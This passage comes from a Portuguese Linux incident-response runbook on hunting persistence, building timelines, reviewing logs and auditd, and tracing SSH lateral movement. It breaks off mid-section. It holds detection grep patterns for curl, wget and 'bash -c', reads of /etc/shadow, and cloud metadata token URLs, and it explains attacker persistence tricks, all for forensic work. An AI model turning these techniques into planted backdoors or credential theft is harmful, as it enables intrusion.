sudo systemd-delta --type=extended     # tudo que sobrescreve ou estende algo do sistema
sudo find /etc/systemd/system -path '*.d/*' -name '*.conf' -newerct "$D" 2>/dev/null
```

> Um `ExecStartPre=` num drop-in de serviço legítimo é persistência quase perfeita: o serviço continua com o mesmo nome, o mesmo arquivo `.service` intacto, e roda o payload antes de subir. **Ler o `.service` não mostra isso** — só `systemctl cat` mostra.

---

# 7.3. Systemd de usuário

```bash
sudo find /home \
  -path '*/.config/systemd/user/*' \
  -type f \
  -print
```

> **Ponto cego clássico:** unit de usuário **não aparece** em `systemctl list-units` de root — só em `systemctl --user` daquele usuário. Pior: com `loginctl enable-linger <USER>` ativo, ela roda **sem ninguém logado**, no boot. Persistência completa sem nunca tocar em `/etc` nem precisar de root.

```bash
loginctl show-user <USER> | grep -i linger
sudo -iu <USER> systemctl --user list-units --type=service
```

---

# 7.4. `at`

```bash
atq                      # só os SEUS jobs
sudo atq                 # os de root
sudo ls -la /var/spool/cron/atjobs /var/spool/at 2>/dev/null    # todos, de todos os usuários
sudo at -c <ID>          # o CONTEÚDO do job
systemctl is-active atd  # sem o atd rodando, nada dispara
```

> **É o gatilho que mais escapa, e por um motivo específico: ele dispara UMA vez, no futuro.** Não é recorrente, então não aparece em nenhuma varredura de "o que roda periodicamente" — e é exatamente assim que um atacante sobrevive à sua limpeza: agenda um job para daqui a seis horas, você limpa tudo, valida na §22, e ele volta de madrugada. Depois de limpar, `atq` é obrigatório.

> **Bônus do `at -c`:** o job guarda o **ambiente inteiro** de quem o criou, no momento da criação. Vale a leitura da §3.6 — `SSH_CONNECTION` ali dentro entrega o IP de origem de quem agendou.

---

# 7.5. SSH

Encontrar chaves:

```bash
sudo find /home /root \
  -path '*/.ssh/authorized_keys' \
  -type f \
  -print
```

Ver metadata:

```bash
sudo stat /home/<USER>/.ssh/authorized_keys
```

Conteúdo:

```bash
sudo cat /home/<USER>/.ssh/authorized_keys
```

Como ler a linha:

```text
[options] <tipo> <chave base64> <comentário>
```

* **comentário** (`user@host` no fim): quem gerou. Um comentário estranho é o nome da máquina do atacante — IOC de graça.
* **options** no início (`command=`, `from=`, `no-pty`): raro em uso normal. `command="..."` executa algo a **cada** login — é backdoor com gatilho.
* **posição**: chave acrescentada no fim, sem quebra de linha antes, é a assinatura do `echo >> authorized_keys`.
* O `ctime` do arquivo (§5.2) data a inserção mesmo que o conteúdo pareça antigo.

> Também vale conferir `sshd_config`: `AuthorizedKeysFile` apontando para outro caminho (ex.: `/etc/ssh/keys/%u`) esconde a chave fora do `~/.ssh` que todo mundo olha.

```bash
sudo sshd -T 2>/dev/null | grep -iE 'authorizedkeys|permitroot|passwordauth|port|allowusers'
```

---

# 7.6. Shell startup

Arquivos importantes:

```text
~/.bashrc
~/.bash_profile
~/.profile
~/.zshrc
/etc/profile
/etc/profile.d/*
```

Pesquisar:

```bash
sudo grep -RInaE \
'curl|wget|bash -c|sh -c|exec -a|/tmp|/dev/shm' \
/home \
/etc/profile \
/etc/profile.d \
2>/dev/null
```

**Qual arquivo roda quando** — é isto que decide qual deles o atacante escolhe:

```text
shell de LOGIN            /etc/profile → ~/.bash_profile ou ~/.profile
shell INTERATIVO          /etc/bash.bashrc → ~/.bashrc      ← o favorito: roda a CADA login SSH
shell NÃO interativo      $BASH_ENV (se definido)            ← roda em script, cron, scp
ao sair                   ~/.bash_logout
zsh                       ~/.zshenv roda SEMPRE, inclusive não interativo  ← o mais forte
qualquer usuário          /etc/profile.d/*.sh — um arquivo ali vale para TODO mundo
```

```bash
grep -rn 'BASH_ENV' /etc /home 2>/dev/null       # o caminho que quase ninguém confere
sudo ls -la /etc/profile.d/                       # arquivo recente aqui atinge todos os usuários
```

> **Onde olhar dentro do arquivo:** no **fim**. `.bashrc` de distro tem dezenas de linhas e ninguém rola até o final — acrescentar lá embaixo, depois de um bloco de linhas em branco, é o padrão. `tail -20` em cada um vale mais que o `grep` acima.

> **O baseline sai de graça:** os arquivos de esqueleto em `/etc/skel` são a versão original que a distro copiou para cada home. Um `diff` mostra tudo que foi acrescentado desde então, sem você precisar de baseline nenhuma.

```bash
for f in .bashrc .profile .bash_profile; do
  for h in /home/*/; do
    [ -f "$h$f" ] && { echo "== $h$f"; diff "/etc/skel/$f" "$h$f" 2>/dev/null | head -20; }
  done
done
```

---

# 7.7. rc.local / init scripts

```bash
sudo cat /etc/rc.local 2>/dev/null
sudo ls -la /etc/init.d/
```

Pesquisar:

```bash
sudo grep -RInaE \
'/tmp|/dev/shm|curl|wget|bash|sh' \
/etc/init.d \
/etc/rc.local \
2>/dev/null
```

```bash
sudo ls -la /etc/rc.local /etc/rc.d/rc.local 2>/dev/null   # PRECISA ser executável para rodar
systemctl status rc-local 2>/dev/null                       # a unit que ainda o executa no boot
sudo stat -c '%n %z' /etc/rc.local /etc/init.d/* 2>/dev/null | sort -k2   # ctime na janela? (§9)
```

> **Por que continua valendo em 2026:** `rc.local` é legado do SysV, mas as distros mantêm um `rc-local.service` que o executa no boot **se o arquivo existir e tiver bit de execução**. É persistência de root, no boot, num arquivo que a maioria dos times nunca abre porque "ninguém usa mais isso". O mesmo vale para `/etc/init.d/`: scripts ali ainda são convertidos em unit pelo `systemd-sysv-generator` e não aparecem em `/etc/systemd/system` (§7.2).

> Detalhe que decide: um `rc.local` **sem** bit de execução é inerte. Se você encontrar um com `chmod +x` recente (§5.2), o `ctime` data a ativação.

---

# 7.8. Dynamic linker / preload

```bash
sudo cat /etc/ld.so.preload 2>/dev/null
```

Pesquisar `LD_PRELOAD`:

```bash
sudo grep -RIna 'LD_PRELOAD' \
/etc \
/home \
2>/dev/null
```

> **Mecanismo (é o rootkit de userland mais comum):** o loader dinâmico carrega as libs listadas em `/etc/ld.so.preload` (global) ou `$LD_PRELOAD` **antes** da libc, em **todo** processo dinâmico. Quem chega primeiro vence a resolução do símbolo. Reescrevendo `readdir()`, `open()` ou `accept()`, a lib esconde arquivos, processos e conexões de `ls`, `ps` e `ss` — **sem tocar no kernel**.

Como furar o disfarce:

```bash
sudo cat /etc/ld.so.preload            # normalmente NÃO EXISTE; se existe, leia cada linha
sudo grep -l 'ld.so.preload' /proc/*/maps 2>/dev/null   # quem carregou a lib
ls /proc/*/exe 2>/dev/null | wc -l ; ps -e | wc -l      # divergência = processo escondido
```

> Binário **estático** (`file` diz `statically linked`) e `busybox` ignoram o preload — por isso servem de "segunda opinião" num host suspeito. Se `ls` e `busybox ls` discordam sobre o mesmo diretório, você tem rootkit.

Duas primas do preload — mesma família, o processo carrega código de onde o atacante escreve:

```bash
sudo cat /etc/ld.so.conf /etc/ld.so.conf.d/*.conf 2>/dev/null   # diretório gravável na busca de libs
grep -rn 'LD_PRELOAD\|LD_LIBRARY_PATH' /etc/environment /etc/security/pam_env.conf 2>/dev/null
```

> `/etc/environment` e o `pam_env` são lidos pelo PAM em **toda sessão**: definir `LD_PRELOAD` ali tem o efeito do `ld.so.preload`, num arquivo que ninguém associa a execução de código. E um diretório gravável em `ld.so.conf.d` é a versão persistente do mesmo truque — a rota de privesc da §36.4 vista como persistência.

---

# 7.9. Usuários e privilégios

Usuários UID 0:

```bash
awk -F: '$3 == 0 {print}' /etc/passwd
```

> **É o UID que define o poder, não o nome.** O kernel só compara números: qualquer conta com `uid=0` **é** root, chame-se `backup`, `systemd-net` ou `ftp`. Por isso a busca é por `$3 == 0` e não por "root".

Outros ângulos rápidos:

```bash
awk -F: '$2 == "" {print $1": SEM SENHA"}' /etc/shadow          # login sem autenticação
awk -F: '$3 >= 1000 && $7 !~ /nologin|false/ {print}' /etc/passwd  # conta de serviço com shell
getent group sudo wheel docker lxd adm 2>/dev/null              # grupos = root indireto
sudo stat -c '%n %z' /etc/passwd /etc/shadow /etc/sudoers        # ctime na janela do incidente?
```

> `docker`, `lxd` e `disk` equivalem a root: quem monta o filesystem do host num container lê e escreve tudo. Conta de serviço que ganhou shell (`/bin/bash` onde era `/usr/sbin/nologin`) é alteração deliberada.

Todos:

```bash
getent passwd
```

Sudoers:

```bash
sudo grep -RIna \
'' \
/etc/sudoers \
/etc/sudoers.d \
2>/dev/null
```

Validar:

```bash
sudo visudo -c
```

---

# 7.10. Supervisores de processo (nível de usuário)

Além do systemd, apps costumam ser mantidas por supervisores que reiniciam
processos — ótimos pontos de persistência (um app "extra" ou script adulterado
que relança o malware). Verifique o que estiver em uso:

```bash
# supervisord
sudo grep -RIna '' /etc/supervisor* 2>/dev/null; sudo supervisorctl status 2>/dev/null
# pm2 (Node), forever, etc. — rode como o usuário dono
sudo -iu <USER> pm2 list 2>/dev/null; sudo -iu <USER> pm2 jlist 2>/dev/null
sudo ls -la /home/<USER>/.pm2/ 2>/dev/null          # dump.pm2 = o que é ressuscitado
# crontab @reboot / user services já cobertos em §7.1–§7.3
```

Procure: apps/scripts desconhecidos, paths em `/tmp` `/dev/shm` `~/.config`,
entradas de startup persistente, um app em crash-loop (pode ser o loader).

---

# 7.11. Containers

Docker:

```bash
sudo docker ps -a --no-trunc
```

Imagens:

```bash
sudo docker images
```

Inspect:

```bash
sudo docker inspect <CONTAINER>
```

Restart policy:

```bash
sudo docker inspect \
  --format '{{.HostConfig.RestartPolicy.Name}}' \
  <CONTAINER>
```

> `restart: always`/`unless-stopped` transforma o Docker no supervisor do malware: você mata o processo, o daemon sobe outro. Pare o **container**, não o processo.

O que procurar no `inspect` (e por quê):

```text
Privileged: true        → sem isolamento; escapar para o host é trivial
Binds/Mounts: /  ou /etc, /root, /var/run/docker.sock → escrita no host = root no host
NetworkMode: host       → o container usa a rede do host direto
CapAdd: SYS_ADMIN...    → capabilities extras devolvem poder de root
Image: sem tag conhecida / registry estranho → imagem plantada
```

> **Fronteira importante:** container não é máquina virtual — é processo isolado por namespace/cgroup no **mesmo kernel**. Comprometimento com `--privileged` ou com o socket do Docker montado é comprometimento **do host**, e a §27 se aplica ao host inteiro. Os PIDs também aparecem no host: `sudo cat /proc/<PID>/cgroup` (§3.11) diz de qual container o processo veio. Para investigar o container em si — sem entrar nele e sem depender do que a imagem tem dentro — vá para a §38.1.

---

# 7.12. Outros pontos de persistência

Vetores menos óbvios, todos abusados na prática. Defina a janela do incidente para filtrar por recém-criados:

```bash
D='2026-04-30'   # data suspeita (ajuste)
```

## PAM (backdoor de autenticação)

```bash
sudo grep -RIna 'pam_exec|pam_.*\.so' /etc/pam.d 2>/dev/null
sudo find /lib*/security /usr/lib*/security -name 'pam_*.so' -newermt "$D" 2>/dev/null
```

## udev (executa em evento de device)

```bash
sudo grep -RInaE 'RUN|PROGRAM' /etc/udev/rules.d 2>/dev/null
```

## Módulos de kernel (rootkit / autoload)

```bash
sudo grep -RIna '' /etc/modules-load.d /etc/modprobe.d 2>/dev/null
sudo lsmod            # compare com baseline; módulos fora de árvore são suspeitos
cat /proc/sys/kernel/tainted   # != 0 pode indicar módulo não assinado/rootkit (decodifique os bits)
sudo dmesg | grep -iE 'taint|module verification failed'
# processos/portas escondidos por LKM: compare visões (ver 'unhide' na §32)
```

## Scripts de login SSH (rodam a cada login)

```bash
sudo find /home /root -path '*/.ssh/rc' 2>/dev/null
sudo cat /etc/ssh/sshrc 2>/dev/null
```

## MOTD dinâmico (Ubuntu; roda no login)

```bash
sudo ls -la /etc/update-motd.d/ 2>/dev/null
sudo grep -RInaE 'curl|wget|base64|/tmp|/dev/shm' /etc/update-motd.d 2>/dev/null
```

## Cron restante (além da §7.1)

```bash
sudo ls -la /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null
sudo cat /etc/anacrontab 2>/dev/null
```

## Hooks de gerenciador de pacote (rodam em update)

```bash
sudo grep -RInaE 'curl|wget|bash|/tmp|/dev/shm' \
  /etc/apt/apt.conf.d /etc/dnf/plugins /etc/yum/pluginconf.d \
  2>/dev/null
```

## Certificado CA plantado (MITM persistente)

Uma CA raiz do atacante faz o host confiar em **qualquer** certificado que ele emitir: update de pacote, chamada de API e webhook passam a ser interceptáveis sem erro de TLS.

```bash
ls -la /usr/local/share/ca-certificates/ /etc/pki/ca-trust/source/anchors/ 2>/dev/null
sudo find /usr/local/share/ca-certificates /etc/pki/ca-trust/source/anchors \
  -newermt "$D" 2>/dev/null
sudo openssl x509 -noout -subject -issuer -dates -in <ARQUIVO.crt>   # emissor, validade
```

## Resolução de nome adulterada

```bash
sudo grep -vE '^\s*#|^\s*$' /etc/hosts        # domínio de update/API apontando para IP do atacante
sudo stat -c '%n %z' /etc/hosts /etc/resolv.conf /etc/nsswitch.conf   # ctime na janela?
sudo grep -RIna '' /etc/systemd/resolved.conf 2>/dev/null | grep -i dns
```

> Junto com a CA acima, isto forma um MITM completo e silencioso: o nome resolve para o atacante e o certificado dele é aceito. Nenhuma ferramenta reclama.

## Hooks do git (rodam a cada deploy)

Servidor que atualiza por `git pull` executa hook em todo deploy — persistência que **sobrevive ao redeploy** e não mora em `/etc`.

```bash
sudo find /srv /opt /var/www /home /data -maxdepth 6 -path '*/.git/hooks/*' \
  -type f ! -name '*.sample' 2>/dev/null
sudo grep -RInaE 'curl|wget|base64|bash -c|/tmp|/dev/shm' \
  $(sudo find /srv /opt /var/www /data -maxdepth 6 -type d -name hooks -path '*/.git/*' 2>/dev/null) \
  2>/dev/null
```

## sshd que busca a chave em outro lugar

```bash
sudo sshd -T 2>/dev/null | grep -iE 'authorizedkeysfile|authorizedkeyscommand'
```

> `AuthorizedKeysCommand` faz o sshd **executar um programa** para obter as chaves aceitas. O `authorized_keys` da §7.5 fica limpo, a auditoria de chave não acusa nada, e a porta continua aberta. Se estiver definido, leia o script apontado como se fosse malware (§5).

## Startup-script no metadata da cloud (fora do filesystem)

Persistência que **não está em disco nenhum**: quem tem credencial de cloud (§10.5) define o script de inicialização da instância, e ele roda como root a **cada boot** — inclusive depois de você trocar o disco.

```bash
# GCP — o que a instância vai executar no próximo boot
curl -s -H 'Metadata-Flavor: Google' \
  'http://169.254.169.254/computeMetadata/v1/instance/attributes/startup-script'
# AWS
curl -s http://169.254.169.254/latest/user-data
# quem executa isso
systemctl status google-startup-scripts cloud-init amazon-ssm-agent 2>/dev/null
```

> **Nenhum comando das §7.1–§7.11 encontra isto** — não há arquivo, cron nem unit. A alteração aparece no audit da cloud (§10.4) e a prevenção é a §34.10. Se a credencial da instância vazou (§10.5), confira isto **antes** de declarar o host limpo — e depois do rebuild também (§27).

## Módulo e hook do servidor web (webshell sem arquivo de webshell)

```bash
grep -rn 'auto_prepend_file\|auto_append_file' /etc/php* 2>/dev/null
sudo find /var/www /srv -name '.htaccess' -newerct "$D" 2>/dev/null
sudo nginx -T 2>/dev/null | grep -i load_module
ls -la /etc/apache2/mods-enabled 2>/dev/null; apachectl -M 2>/dev/null | tail -20
```

> `auto_prepend_file` faz o PHP executar um arquivo **antes de cada requisição**, em qualquer rota. O docroot fica limpo, o grep de webshell da §16 não acha nada, e o backdoor roda em 100% dos acessos. Um módulo carregado no nginx/apache tem o mesmo efeito, um nível abaixo.

## Generators do systemd

```bash
sudo ls -la /etc/systemd/system-generators /usr/lib/systemd/system-generators 2>/dev/null
```

> Executável ali roda **como root a cada boot**, antes de qualquer unit — e não aparece em `systemctl list-units`.

## `.forward` e aliases de e-mail

```bash
sudo find /home /root -name '.forward' -o -name '.procmailrc' 2>/dev/null
sudo grep -n '|' /etc/aliases 2>/dev/null
```

> Uma linha `|"/caminho/comando"` faz o MTA executar aquilo a cada e-mail recebido. Legado, mas continua funcionando onde há MTA local.

## Contas na camada de dados (sobrevivem ao rebuild)

Usuário ou role criado no banco não some quando você recria a VM — e a §27 não olha para lá.

```bash
sudo -u postgres psql -Atc \
  "select rolname,rolsuper,rolcanlogin from pg_roles order by 1;" 2>/dev/null
mysql -Nse "select user,host from mysql.user;" 2>/dev/null
redis-cli ACL LIST 2>/dev/null
```

> Cheque também o que o **banco** executa sozinho: `pg_cron`/extensão e trigger no PostgreSQL, `EVENT` no MySQL, módulo carregado no Redis. É a §7.1 um andar acima, fora do alcance de tudo que este runbook varre no filesystem.

---

# 8. Arquivos suspeitos pelo filesystem

> **Por quê:** achar o que foi plantado, mesmo sem um processo rodando no momento. **Olhe para:** ELF/executáveis em `~/.config`, `~/.cache`, `/tmp`, `/dev/shm`, e arquivos criados na janela do incidente.

Executáveis em locais incomuns:

```bash
sudo find \
/home \
/tmp \
/var/tmp \
/dev/shm \
-type f \
-perm /111 \
-ls \
2>/dev/null
```

---

## ELFs em home/tmp

```bash
sudo find \
/home \
/tmp \
/var/tmp \
/dev/shm \
-type f \
-exec sh -c '
  file "$1" | grep -q ELF && echo "$1"
' _ {} \; \
2>/dev/null
```

---

## Arquivos recentemente alterados

Últimas 24 horas:

```bash
sudo find \
/home \
/tmp \
/var/tmp \
/dev/shm \
/data \
-ctime -1 \
-ls \
2>/dev/null
```

Últimos 7 dias:

```bash
sudo find \
/home \
/tmp \
/var/tmp \
/dev/shm \
/data \
-ctime -7 \
-ls \
2>/dev/null
```

---

# 9. Timeline

> **Confie no relógio antes de confiar na timeline.** Toda análise por `ctime`/`mtime` assume que a hora do host está correta. Se o atacante mexeu no relógio (ou o NTP falhou), os timestamps mentem. Verifique e, na dúvida, use os **timestamps off-box (cloud/log central)** como verdade-âncora — são independentes do host.

```bash
timedatectl                      # timezone, sincronização NTP, offset
sudo journalctl -u systemd-timesyncd -u chronyd -u ntpd 2>/dev/null | grep -iE 'step|jump|adjust|change'
last -x | grep -iE 'time change'   # mudanças de hora registradas no wtmp
```

Defina uma janela:

```bash
START='2026-04-30 18:20:00'
END='2026-04-30 18:40:00'
```

Buscar por `ctime`:

```bash
sudo find \
/home \
/tmp \
/var/tmp \
/dev/shm \
/data \
-xdev \
-newerct "$START" \
! -newerct "$END" \
-printf '%CY-%Cm-%Cd %CT %u %g %m %s %p\n' \
2>/dev/null \
| sort
```

Buscar por `mtime`:

```bash
sudo find \
/home \
/tmp \
/var/tmp \
/dev/shm \
/data \
-xdev \
-newermt "$START" \
! -newermt "$END" \
-printf '%TY-%Tm-%Td %TT %u %g %m %s %p\n' \
2>/dev/null \
| sort
```

> Em incidente, normalmente vale procurar primeiro por `ctime`.

```text
-xdev       não atravessa mounts → evita varrer NFS/procfs e travar (veja abaixo)
-newerct X  ctime mais recente que X
! -newerct Y  ... e mais antigo que Y  → o par delimita a janela
-printf     imprime o timestamp junto, para o 'sort' ordenar de fato
```

> **Por que a timeline funciona:** uma intrusão é uma sequência de escritas em segundos. Ordenados por tempo, os artefatos contam a história sozinhos — diretório criado, binário escrito, `chmod +x`, cron alterado, log tocado. Se você tem só **um** timestamp confiável (o do artefato), ele é o âncora: leve-o para todas as outras fontes (§9.1).

> Comece com a janela **estreita** (minutos em volta do âncora) e vá abrindo. Janela larga em `/home` retorna milhares de linhas de ruído legítimo e você perde o sinal.

---

## Filesystems remotos

Ver mounts:

```bash
findmnt
```

Se houver NFS/CIFS/Gluster, pesquise separadamente:

```bash
sudo find /backup \
-newerct "$START" \
! -newerct "$END" \
-printf '%CY-%Cm-%Cd %CT %u %g %m %s %p\n' \
2>/dev/null \
| sort
```

---

## 9.1. Correlação de sinais

Um ataque deixa rastro em VÁRIAS fontes no mesmo instante. A técnica: achar um **âncora temporal** e pivotar para todas as outras fontes na mesma janela. Muita coisa que parece "operacional" é, na verdade, tentativa/scan/exploração.

### Sinais que podem ser ataque (não só bug)

```text
restart de serviço fora do padrão   → exploit malformado derruba o processo; supervisor relança
muitos restarts / crash-loop         → fuzzing, DoS, ou exploração instável
pico no tamanho/volume de log        → tráfego anômalo (scan, brute, exploração)
rajada de 4xx (401/403/404)          → scan de rotas / brute force / enumeração
rajada de 5xx / erros de parse       → payloads malformados (tentativa de exploração)
segfault / OOM-killer                → exploração de memória / DoS
conexões recusadas/timeouts em massa → varredura de portas
```

### Achar o âncora (quando algo "estranho" aconteceu)

```bash
# restarts de serviço (systemd): quantos e quando
systemctl show <SVC> -p NRestarts
sudo journalctl -u <SVC> | grep -iE 'started|stopped|main process exited|failed|signal'
# crashes no kernel/sistema
sudo journalctl -k | grep -iE 'segfault|oom|killed process'
sudo grep -iE 'segfault|oom-killer|panic|traceback' /var/log/messages* 2>/dev/null
```

### Padrão-base vs desvio (o desvio é o âncora)

```bash
# VOLUME de log por dia: um salto = anomalia (aquele dia teve algo)
for f in /var/log/<SVC>*; do printf '%s\t' "$(stat -c %s "$f")"; echo "$f"; done | sort -n
# meses de ~250 bytes/dia e de repente 6 KB num dia -> investigue esse dia

# rajada de erros HTTP no access log (scan/fuzz)
sudo awk '{print $9}' /var/log/nginx/access.log 2>/dev/null | sort | uniq -c | sort -rn
# 4xx/5xx agrupados por minuto (pico = varredura)
sudo grep -E ' (4[0-9]{2}|5[0-9]{2}) ' /var/log/nginx/access.log 2>/dev/null \
  | awk '{print $4}' | cut -d: -f1-3 | uniq -c | sort -rn | head
```

### Com a janela definida, cruze TODAS as fontes

```bash
START='2026-04-30 18:20:00'; END='2026-04-30 18:40:00'
```

```text
filesystem (ctime)   → §9      arquivos escritos no instante = o kit dropado
auth / SSH           → §12     login/pivô no mesmo minuto?
audit (EXECVE)       → §11     comando executado + processo pai (o vetor)
web/access log       → §10     a requisição de exploração (método, rota, payload, IP)
restart do serviço   → 9.1     o processo caiu/reiniciou no instante?
rede                 → §2      conexão de saída (C2) logo após?
cloud (off-box)      → §10.4   se o log local rotacionou
```

> Convergência é prova: se o `ctime` de um artefato, um restart do serviço, uma
> requisição anômala no access log e um `EXECVE` no audit caem no **mesmo segundo**,
> a cadeia está amarrada. Um sinal isolado é pista; a convergência é o laudo.

---

# 10. Logs

> **Por quê:** achar a requisição de entrada e a atividade do atacante no tempo. **Olhe para:** rajada de 4xx/5xx (scan/fuzz), `POST` estranho na hora do incidente, erros de auth. **Cheque a retenção primeiro** — se o log local já rotacionou, a evidência pode estar off-box (§10.4).

---

## 10.1. systemd journal

Últimas horas:

```bash
sudo journalctl --since '2 hours ago'
```

Por período:

```bash
sudo journalctl \
  --since '2026-04-30 18:20:00' \
  --until '2026-04-30 18:40:00'
```

Por service:

```bash
sudo journalctl -u <SERVICE>
```

Por PID:

```bash
sudo journalctl _PID=<PID>
```

Integridade (anti-forense — logs adulterados/truncados):

```bash
sudo journalctl --verify 2>&1 | tail        # journal corrompido/alterado?
ls -la /var/log/* | grep ' 0 '              # arquivos zerados (truncados)
sudo journalctl --list-boots                # gaps de boot inesperados
```

> Gaps, arquivos zerados ou `--verify` com erro = possível limpeza de log. A cópia off-box (§10.4) não é alterável pelo atacante — prefira-a.

---

## 10.2. RHEL/CentOS

Principais:

```text
/var/log/secure
/var/log/messages
/var/log/cron
/var/log/audit/
/var/log/nginx/
/var/log/httpd/
```

Buscar IOC:

```bash
sudo zgrep -Hni '<IOC>' \
/var/log/secure* \
/var/log/messages* \
/var/log/cron* \
/var/log/nginx/* \
/var/log/httpd/* \
2>/dev/null
```

---

## 10.3. Debian/Ubuntu

Principais:

```text
/var/log/auth.log
/var/log/syslog
/var/log/nginx/
/var/log/apache2/
```

```bash
sudo zgrep -Hni '<IOC>' \
/var/log/auth.log* \
/var/log/syslog* \
/var/log/nginx/* \
/var/log/apache2/* \
2>/dev/null
```

---

## 10.4. Cloud — a evidência pode estar OFF-BOX

Logs locais rotacionam rápido (às vezes 2–5 dias). Se o incidente é antigo, o local pode ter sumido — mas o cloud retém mais e é à prova de adulteração pelo atacante.

**Primeiro: cheque a retenção local (decide se ainda existe aqui).**

```bash
ls -la /var/log/cron* /var/log/messages* /var/log/secure* /var/log/audit/ 2>/dev/null
# até qual data os .gz vão? Se não cobre o incidente -> vá para o cloud.
```

**Há agente de logging? (define o que foi para o cloud)**

```bash
systemctl status google-cloud-ops-agent stackdriver-agent \
  amazon-cloudwatch-agent rsyslog 2>/dev/null
cat /etc/google-cloud-ops-agent/config.yaml 2>/dev/null   # quais arquivos são enviados
```

**Evidência off-box (retenção longa). Lembre: cloud usa UTC.**

```bash
# GCP — Cloud Logging (syslog/audit shipado):
gcloud logging read \
  'timestamp>="2026-04-30T21:20:00Z" AND timestamp<="2026-04-30T21:40:00Z"' \
  --limit 300 --freshness=200d
# GCP — Cloud Audit / Admin Activity (SEMPRE ligado, ~400 dias):
#   abuso de credencial da service-account (via SSRF ao metadata) aparece aqui
# GCP — VPC Flow Logs (se habilitado): conexão de entrada na porta + saída do C2
# AWS — CloudTrail (90d+), VPC Flow Logs, CloudWatch Logs
```

## 10.5. Metadata / roubo de credencial de instância (cloud)

Se a app comprometida tem SSRF, o atacante alcança o metadata e rouba o token da service-account/instance-role → **pivô para todo o projeto/conta**. Verifique e trate como exposto:

```text
GCP:  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
AWS:  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

* Rotacione/reveja a **service-account da instância** (não só os `.env`).
* Revise o audit do cloud por uso anômalo do token **após** a data do incidente.
* Bloqueie egress ao `169.254.169.254` para o usuário da app (ver §18).

---

# 11. Auditd

> **Por quê:** se o auditd estiver ativo, é a fonte mais forte — registra `execve` e escrita de arquivo **com o processo pai e o usuário**, amarrando o vetor. **Olhe para:** `sh`/`curl`/`bash`/`base64` cujo pai é o processo da aplicação, na janela do incidente. (Se estiver desligado, pule.)

Está ligado?

```bash
sudo systemctl is-active auditd ; sudo auditctl -s ; sudo auditctl -l
```

> **O que torna o auditd único:** ele grava no **kernel**, no momento da syscall, com `ppid`, `auid` e `exe` juntos. O `auid` (*audit UID*) é o carimbo do login original e **não muda** com `su`/`sudo` — é o que liga uma ação de `root` de volta à pessoa que entrou. Nenhuma outra fonte do host faz isso.

Por período:

```bash
sudo ausearch \
-ts '04/30/2026 18:20:00' \
-te '04/30/2026 18:40:00'
```

Por UID:

```bash
sudo ausearch \
-ts '04/30/2026 18:20:00' \
-te '04/30/2026 18:40:00' \
-ua <UID> \
-i
```

Executáveis:

```bash
sudo ausearch -m EXECVE -i
```

Por arquivo (quem tocou/escreveu) e por PID:

```bash
sudo ausearch -f /home/<USER>/.config/htop/defunct -i   # quem criou/acessou o arquivo
sudo ausearch -p <PID> -i                                # tudo do processo
```

> Amarra o vetor: um `EXECVE` de `sh`/`curl`/`bash` cujo processo pai é o processo da aplicação (o serviço que escuta a porta) prova o pulo "RCE → comando".

Se estava **desligado**, ligue agora — o próximo movimento do atacante (ou a reincidência da §22) fica gravado:

```bash
sudo auditctl -w /etc/passwd -p wa -k ir_passwd
sudo auditctl -w /home/<USER>/.ssh -p wa -k ir_ssh
sudo auditctl -a always,exit -F arch=b64 -S execve -F auid>=1000 -k ir_exec
```

> Regras via `auditctl` valem até o reboot; para permanentes, `/etc/audit/rules.d/`. Custo: `execve` sem filtro gera volume alto — use `-F` para restringir a usuário/diretório de interesse.

---

# 12. Login / SSH e movimentação lateral

> **Por quê:** ver acesso interativo e se o atacante saltou de/para outros hosts. **Olhe para:** login de IP incomum na hora do incidente, `authorized_keys` novo, túneis SSH (`-L/-R/-D`), agente encaminhado (`SSH_AUTH_SOCK`), conexões de saída para :22 interno.

Usuários atuais:

```bash
who
w
```

Histórico:

```bash
last -Fai
```

Último login:

```bash
lastlog
```

```text
last      lê /var/log/wtmp   (histórico de login/logout)
lastb     lê /var/log/btmp   (tentativas FALHAS → brute force)
lastlog   lê /var/log/lastlog (último login por usuário)
who/w     leem /var/run/utmp  (sessões AGORA)
```

> **Esses arquivos são binários e graváveis por root** — apagar a própria sessão do `wtmp` (com `utmpdump`, editar, recarregar) é anti-forense básica. Sinais: `last` com salto temporal, arquivo com tamanho 0, `ctime` recente sem motivo. **A prova real está no `sshd` do log de auth** (`/var/log/secure`, `auth.log`, journal), que registra IP, chave/fingerprint usada e método — e melhor ainda na cópia off-box (§10.4).

```bash
sudo lastb | head -20                                    # brute force antes do sucesso?
sudo stat /var/log/wtmp /var/log/btmp /var/log/lastlog   # zerado ou tocado?
```

Conexões SSH atuais:

```bash
sudo ss -tnp | grep ':22'
```

---

## 12.1. Movimentação lateral — a partir deste host

Descobrir se o atacante saltou daqui para OUTRAS máquinas.

### SSH de saída (este host como cliente)

```bash
# conexões de saída para :22 (este host conectando em outros)
sudo ss -tnp | awk '$5 ~ /:22$/'
# processos ssh/scp/sftp ativos e seus argumentos (revela destino e túneis)
sudo ps -eo pid,user,args | grep -E '\bssh\b|scp|sftp|rsync' | grep -v grep
```

### Alvos que este host alcançou

```bash
# hosts para onde já se conectou (mesmo com HashKnownHosts, o nº de entradas mostra alcance)
sudo find /home /root -path '*/.ssh/known_hosts' -exec sh -c 'echo "== $1 =="; wc -l "$1"' _ {} \;
# atalhos/config: ProxyJump, ForwardAgent, hosts pré-configurados
sudo find /home /root -path '*/.ssh/config' -exec cat {} \;
```

### Agent forwarding sequestrado (pivô sem roubar a chave)

Se um SSH com `-A`/`ForwardAgent` chegou aqui, o atacante usa o **socket do agente** para saltar para onde a chave tem acesso, sem nunca ver a chave privada.

```bash
# sockets de agente ativos
sudo ls -la /tmp/ssh-*/agent.* 2>/dev/null
# processos com SSH_AUTH_SOCK no environ (podem reusar o agente)
for p in $(pgrep -u '<USER>' .); do
  sudo grep -qa SSH_AUTH_SOCK /proc/$p/environ 2>/dev/null && echo "PID $p usa SSH_AUTH_SOCK"
done
```

### Chaves privadas expostas (roubo para pivô)

```bash
sudo find /home /root /tmp /dev/shm -name 'id_*' ! -name '*.pub' -type f 2>/dev/null
sudo find / -xdev -name 'authorized_keys' -newermt "$D" 2>/dev/null   # chave nova plantada
```

## 12.2. Túneis, port forwarding e pivô

> **Por quê:** descobrir se este host virou **caminho** — se o atacante o usa para alcançar o que ele não alcança de fora. **Olhe para:** a assinatura estrutural, não o nome do processo: um pivô fala com os dois lados **ao mesmo tempo**.

### A assinatura que não depende do nome

Um relay é, por construção, um processo com socket para fora **e** socket para a rede interna, simultaneamente:

